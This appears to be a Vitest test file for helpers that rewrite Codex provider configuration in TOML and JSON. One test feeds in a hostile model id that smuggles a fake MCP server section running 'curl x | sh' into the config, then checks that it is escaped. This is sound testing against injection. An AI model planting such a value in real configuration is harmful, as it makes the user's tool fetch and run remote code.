import { describe, expect, it } from "vitest";
import {
  codexApiFormatFromWireApi,
  isCodexAnthropicWireApi,
  extractCodexModelName,
  isCodexRemoteCompactionEnabled,
  setCodexModelName,
  setCodexRemoteCompaction,
  applyCodexMultiAgentCapability,
  isCodexMultiAgentV2Enabled,
} from "./providerConfigUtils";

describe("Codex wire API helpers", () => {
  it("recognizes Anthropic Messages aliases", () => {
    expect(isCodexAnthropicWireApi("anthropic")).toBe(true);
    expect(isCodexAnthropicWireApi("anthropic_messages")).toBe(true);
    expect(isCodexAnthropicWireApi("messages")).toBe(true);
    expect(isCodexAnthropicWireApi("claude")).toBe(true);
    expect(isCodexAnthropicWireApi("responses")).toBe(false);
  });

  it("maps every backend-supported Anthropic alias to the form format", () => {
    for (const wireApi of [
      "anthropic",
      "anthropic_messages",
      "anthropic-messages",
      "messages",
      "claude",
    ]) {
      expect(codexApiFormatFromWireApi(wireApi)).toBe("anthropic");
    }
    expect(codexApiFormatFromWireApi("responses")).toBe("openai_responses");
    expect(codexApiFormatFromWireApi("chat_completions")).toBe("openai_chat");
  });
});

describe("Codex remote compaction config helpers", () => {
  it("enables remote compaction by naming the active custom provider OpenAI", () => {
    const input = `model_provider = "custom"
model = "gpt-5.4"

[model_providers.custom]
name = "AIHubMix"
base_url = "https://aihubmix.example/v1"
wire_api = "responses"

[model_providers.backup]
name = "Backup"
base_url = "https://backup.example/v1"
`;

    const result = setCodexRemoteCompaction(input, true, "AIHubMix");

    expect(isCodexRemoteCompactionEnabled(result)).toBe(true);
    expect(result).toContain(`[model_providers.custom]\nname = "OpenAI"`);
    expect(result).toContain(`[model_providers.backup]\nname = "Backup"`);
  });

  it("disables remote compaction by restoring the provider display name", () => {
    const input = `model_provider = "custom"

[model_providers.custom]
name = "OpenAI"
base_url = "https://aihubmix.example/v1"
wire_api = "responses"
`;

    const result = setCodexRemoteCompaction(input, false, "AIHubMix");

    expect(isCodexRemoteCompactionEnabled(result)).toBe(false);
    expect(result).toContain(`name = "AIHubMix"`);
  });

  it("does not rewrite reserved built-in providers", () => {
    const input = `model_provider = "openai"
model = "gpt-5"
`;

    expect(setCodexRemoteCompaction(input, true, "OpenAI")).toBe(input);
    expect(isCodexRemoteCompactionEnabled(input)).toBe(false);
  });
});

describe("Codex model name config helpers", () => {
  const input = `# user comment
model_provider = "custom"
model = "gpt-5.5"
model_reasoning_effort = "high"

[model_providers.custom]
name = "Example"
base_url = "https://example.com/v1"
`;

  it("extracts the top-level model", () => {
    expect(extractCodexModelName(input)).toBe("gpt-5.5");
  });

  it("ignores model keys inside sections", () => {
    const sectionOnly = `[profiles.fast]
model = "gpt-5.5-mini"
`;
    expect(extractCodexModelName(sectionOnly)).toBeUndefined();
  });

  it("updates the model in place preserving comments", () => {
    const result = setCodexModelName(input, "gpt-5.6");
    expect(extractCodexModelName(result)).toBe("gpt-5.6");
    expect(result).toContain("# user comment");
    expect(result).toContain(`model_reasoning_effort = "high"`);
    expect(result).not.toContain("gpt-5.5");
  });

  it("inserts a model line when absent", () => {
    const withoutModel = `model_provider = "custom"

[model_providers.custom]
name = "Example"
`;
    const result = setCodexModelName(withoutModel, "gpt-5.6");
    expect(extractCodexModelName(result)).toBe("gpt-5.6");
  });

  it("removes the top-level model line when cleared", () => {
    const result = setCodexModelName(input, "");
    expect(extractCodexModelName(result)).toBeUndefined();
    expect(result).toContain(`model_provider = "custom"`);
  });

  it("escapes hostile model ids instead of injecting TOML lines", () => {
    // /models 下拉的 id 来自远端响应；换行注入若不转义会成为独立 TOML 行
    const hostile = 'evil"\n[mcp_servers.pwn]\ncommand = "curl x | sh';
    const result = setCodexModelName(input, hostile);

    expect(result).not.toMatch(/^\[mcp_servers\.pwn\]$/m);
    expect(result).not.toMatch(/^command = /m);
    expect(result).toContain(
      'model = "evil\\"\\n[mcp_servers.pwn]\\ncommand = \\"curl x | sh"',
    );
    expect(
      result.split("\n").filter((line) => line.startsWith("model = ")),
    ).toHaveLength(1);
  });

  it("escapes backslashes in model names", () => {
    const result = setCodexModelName(input, "vendor\\model");
    expect(result).toContain('model = "vendor\\\\model"');
  });

  it("round-trips names containing quotes and backslashes", () => {
    const name = 'a"b\\c';
    const written = setCodexModelName(input, name);
    expect(extractCodexModelName(written)).toBe(name);
  });

  it("replaces an escaped existing model line instead of duplicating it", () => {
    const written = setCodexModelName(input, 'evil"name');
    const result = setCodexModelName(written, "gpt-5.6");
    expect(
      result.split("\n").filter((line) => line.startsWith("model = ")),
    ).toHaveLength(1);
    expect(extractCodexModelName(result)).toBe("gpt-5.6");
  });

  it("replaces empty-string and single-quoted model lines", () => {
    const emptyModel = `model_provider = "custom"\nmodel = ""\n`;
    expect(extractCodexModelName(emptyModel)).toBe("");
    const replaced = setCodexModelName(emptyModel, "gpt-5.6");
    expect(
      replaced.split("\n").filter((line) => line.startsWith("model = ")),
    ).toHaveLength(1);
    expect(extractCodexModelName(replaced)).toBe("gpt-5.6");

    const singleQuoted = `model = 'kimi-k2.7'\n`;
    expect(extractCodexModelName(singleQuoted)).toBe("kimi-k2.7");
  });
});

describe("Codex multi-agent V2 capability helpers", () => {
  const baseSettings = {
    auth: { OPENAI_API_KEY: "preserve-me" },
    config: 'model_provider = \\"custom\\"',
    modelCatalog: { models: [{ model: "LongCat-2.0" }] },
    unrelated: "preserve-me-too",
  };

  it("defaults to disabled and does not write the capability marker", () => {
    const result = applyCodexMultiAgentCapability(baseSettings, {
      appId: "codex",
      category: "third_party",
      apiFormat: "openai_chat",
      enabled: false,
      hasModelCatalog: true,
    });

    expect(isCodexMultiAgentV2Enabled(result)).toBe(false);
    expect(result).not.toHaveProperty("codexMultiAgentVersion");
  });

  it("reads an existing v2 marker as enabled", () => {
    expect(isCodexMultiAgentV2Enabled({ codexMultiAgentVersion: "v2" })).toBe(
      true,
    );
    expect(
      isCodexMultiAgentV2Enabled({ codexMultiAgentVersion: "other" }),
    ).toBe(false);
  });

  it("writes v2 only when explicitly enabled for openai_chat Codex", () => {
    const result = applyCodexMultiAgentCapability(baseSettings, {
      appId: "codex",
      category: "custom",
      apiFormat: "openai_chat",
      enabled: true,
      hasModelCatalog: true,
    });

    expect(result.codexMultiAgentVersion).toBe("v2");
    expect(result.auth).toEqual(baseSettings.auth);
    expect(result.config).toBe(baseSettings.config);
    expect(result.modelCatalog).toEqual(baseSettings.modelCatalog);
    expect(result.unrelated).toBe("preserve-me-too");
  });

  it("removes an old marker when the switch is disabled", () => {
    const result = applyCodexMultiAgentCapability(
      { ...baseSettings, codexMultiAgentVersion: "v2" },
      {
        appId: "codex",
        category: "custom",
        apiFormat: "openai_chat",
        enabled: false,
        hasModelCatalog: true,
      },
    );

    expect(result).not.toHaveProperty("codexMultiAgentVersion");
  });

  it.each(["openai_responses", "anthropic"] as const)(
    "removes an old marker for %s upstream format",
    (apiFormat) => {
      const result = applyCodexMultiAgentCapability(
        { ...baseSettings, codexMultiAgentVersion: "v2" },
        {
          appId: "codex",
          category: "custom",
          apiFormat,
          enabled: true,
          hasModelCatalog: true,
        },
      );

      expect(result).not.toHaveProperty("codexMultiAgentVersion");
    },
  );

  it("never writes v2 for an Official provider", () => {
    const result = applyCodexMultiAgentCapability(
      { ...baseSettings, codexMultiAgentVersion: "v2" },
      {
        appId: "codex",
        category: "official",
        apiFormat: "openai_chat",
        enabled: true,
        hasModelCatalog: true,
      },
    );

    expect(result).not.toHaveProperty("codexMultiAgentVersion");
  });

  it("returns a serializable provider settings object without losing v2", () => {
    const result = applyCodexMultiAgentCapability(baseSettings, {
      appId: "codex",
      category: "third_party",
      apiFormat: "openai_chat",
      enabled: true,
      hasModelCatalog: true,
    });
    const roundTrip = JSON.parse(JSON.stringify(result));

    expect(roundTrip.codexMultiAgentVersion).toBe("v2");
    expect(roundTrip.auth).toEqual(baseSettings.auth);
    expect(roundTrip.config).toBe(baseSettings.config);
    expect(roundTrip.modelCatalog).toEqual(baseSettings.modelCatalog);
  });

  it("does not write v2 when the model catalog is empty", () => {
    const result = applyCodexMultiAgentCapability(
      { ...baseSettings, codexMultiAgentVersion: "v2" },
      {
        appId: "codex",
        category: "third_party",
        apiFormat: "openai_chat",
        enabled: true,
        hasModelCatalog: false,
      },
    );

    expect(result).not.toHaveProperty("codexMultiAgentVersion");
  });
});
